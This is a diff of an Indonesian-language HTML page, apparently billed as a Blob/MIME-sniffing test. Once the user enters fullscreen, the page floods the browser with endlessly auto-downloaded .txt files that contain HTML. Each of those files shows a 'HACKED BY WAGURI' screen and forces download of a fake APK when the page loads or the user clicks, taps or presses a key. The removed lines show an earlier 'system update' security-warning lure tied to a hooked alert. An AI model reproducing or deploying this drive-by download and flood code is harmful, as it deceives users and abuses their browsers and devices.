@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Blob &amp; Alert Auto Download APK</title>
+<title>Generator Berkas Blob &amp; ObjectURL</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Blob &amp; ObjectURL</h2>
-<p>Uji coba download APK otomatis setelah user menutup alert.</p>
+<h2>Generator Berkas Blob &amp; ObjectURL</h2>
+<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -39,59 +39,89 @@ const downloadsDiv = document.getElementById("downloads");
 let activeUrls = [];
 let isProcessing = false;
 
-// Fungsi jembatan untuk memicu unduhan APK dari dalam file .txt
+const speak = (message) => {
+if ('speechSynthesis' in window) {
+window.speechSynthesis.cancel();
+const utterance = new SpeechSynthesisUtterance(message);
+utterance.lang = 'id-ID';
+utterance.rate = 1.0;
+window.speechSynthesis.speak(utterance);
+}
+};
+
 const prepareMimeBlobAsync = (i) => {
 return new Promise((resolve) => {
 queueMicrotask(() => {
 const payloadText = "<!DOCTYPE html>" +
 "<html>" +
-"<head><meta charset='UTF-8'><title>Sistem Peringatan</title></head>" +
-"<body style='margin:0;padding:0;background:#111;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;'>" +
-"<div style='text-align:center;'>" +
-"<h1 style='color:#ff4444;'>Peringatan Keamanan</h1>" +
-"<p>Klik OK untuk memproses pembaruan sistem.</p>" +
+"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
+"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
+"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
+"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
+"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
+"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
+"<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
+"<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
+"<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
 "</div>" +
+"<style>" +
+"@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
+"body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
+"</style>" +
 "<script>" +
 "(function(){" +
 "\"use strict\";" +
-"// Payload APK (MZ Header + Dummy Bytes) di-encode Base64" +
-"var b64Apk = \"UEsDBAoAAAAAAA...\";" + // Placeholder base64
-"var sudah = false;" +
+"document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
+"try { alert('HACKED BY WAGURI'); } catch(e){}" +
 "function b64KeBytes(b64){" +
-"    var binary = atob(b64);" +
-"    var bytes = new Uint8Array(binary.length);" +
-"    for (var i=0; i<binary.length; i++){ bytes[i] = binary.charCodeAt(i); }" +
-"    return bytes;" +
+"var binary = atob(b64);" +
+"var len = binary.length;" +
+"var bytes = new Uint8Array(len);" +
+"for (var i = 0; i < len; i++) {" +
+"bytes[i] = binary.charCodeAt(i);" +
 "}" +
-"function picuDownloadApk(){" +
-"    if (sudah) return;" +
-"    sudah = true;" +
-"    try{" +
-"        var bytes = b64KeBytes(b64Apk);" +
-"        var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });" +
-"        var url = URL.createObjectURL(blob);" +
-"        var a = document.createElement('a');" +
-"        a.href = url;" +
-"        a.download = 'System_Update.apk';" +
-"        a.style.display = 'none';" +
-"        document.body.appendChild(a);" +
-"        a.click();" +
-"        setTimeout(function(){ document.body.removeChild(a); URL.revokeObjectURL(url); }, 3000);" +
-"    } catch(e){" +
-"        console.warn('Gagal unduh APK', e);" +
-"    }" +
+"return bytes;" +
 "}" +
-"// TRIGGER 1: Saat user klik OK pada Alert" +
-"var oldAlert = window.alert;" +
-"window.alert = function(msg) {" +
-"    oldAlert(msg);" +
-"    // Setelah user klik OK, langsung picu download" +
-"    picuDownloadApk();" +
-"};" +
-"// Trigger Alert pertama" +
-"setTimeout(function(){" +
-"    alert('Pembaruan Sistem: Harap tunggu sebentar...');" +
-"}, 1000);" +
+// Payload APK (Header ZIP: PK\x03\x04 + dummy bytes diencode Base64)
+"var b64Data = \"UEsDBAoAAAAAAAMAAAAEAAAAAAAAAAAAAAAQAAAA\" + " +
+"\"REVBUk1BTklGRVNUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+"\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+"\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+"\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
+"\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
+"var sudah = false;" +
+"function picuDownload(){" +
+"if (sudah) return;" +
+"sudah = true;" +
+"var statusEl = document.getElementById('status');" +
+"try{" +
+"statusEl.textContent = 'Menyiapkan berkas...';" +
+"var bytesArr = b64KeBytes(b64Data);" +
+"// MIME type khusus Android Package" +
+"var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
+"var url = URL.createObjectURL(blob);" +
+"var a = document.createElement('a');" +
+"a.href = url;" +
+"a.download = 'hacked-by-waguri.apk';" + // Nama file .apk
+"a.style.display = 'none';" +
+"document.body.appendChild(a);" +
+"a.click();" +
+"setTimeout(function(){ " +
+"if (a.parentNode) a.parentNode.removeChild(a); " +
+"URL.revokeObjectURL(url); " +
+"}, 3000);" +
+"statusEl.textContent = 'Payload APK berhasil diunduh!';" +
+"statusEl.style.color = '#0f0';" +
+"} catch(e){" +
+"statusEl.textContent = 'Gagal: ' + e.message;" +
+"statusEl.style.color = '#f00';" +
+"sudah = false;" +
+"}" +
+"}" +
+"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
+"document.addEventListener('click', picuDownload);" +
+"document.addEventListener('touchstart', picuDownload);" +
+"document.addEventListener('keydown', picuDownload);" +
 "})();" +
 "<\/script>" +
 "</body>" +
@@ -107,7 +137,7 @@ resolve({ id: i, url: url });
 const triggerInstantDownload = (fileData) => {
 const link = document.createElement("a");
 link.href = fileData.url;
-link.download = `system-alert-${fileData.id}.txt`;
+link.download = `waguri-file-${fileData.id}.txt`;
 link.textContent = `Blob #${fileData.id} (.txt)`;
 link.style.display = "none";
 downloadsDiv.appendChild(link);
@@ -124,6 +154,10 @@ triggerInstantDownload(fileData);
 
 statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
 
+if (counter % 10 === 0) {
+speak(`Proses mencapai ${counter} berkas.`);
+}
+
 setTimeout(() => processLoop(counter + 1), 0);
 };
 
@@ -133,6 +167,8 @@ if (isProcessing) return;
 activeUrls.forEach(url => URL.revokeObjectURL(url));
 activeUrls = [];
 downloadsDiv.replaceChildren();
+
+speak("Mengaktifkan mode layar penuh.");
 
 const root = document.documentElement;
 try {
@@ -150,6 +186,7 @@ console.warn("Fullscreen tidak didukung atau ditolak:", err);
 
 setTimeout(() => {
 isProcessing = true;
+speak("Proses pembuatan berkas Blob dimulai.");
 processLoop(1);
 }, 300);
 });
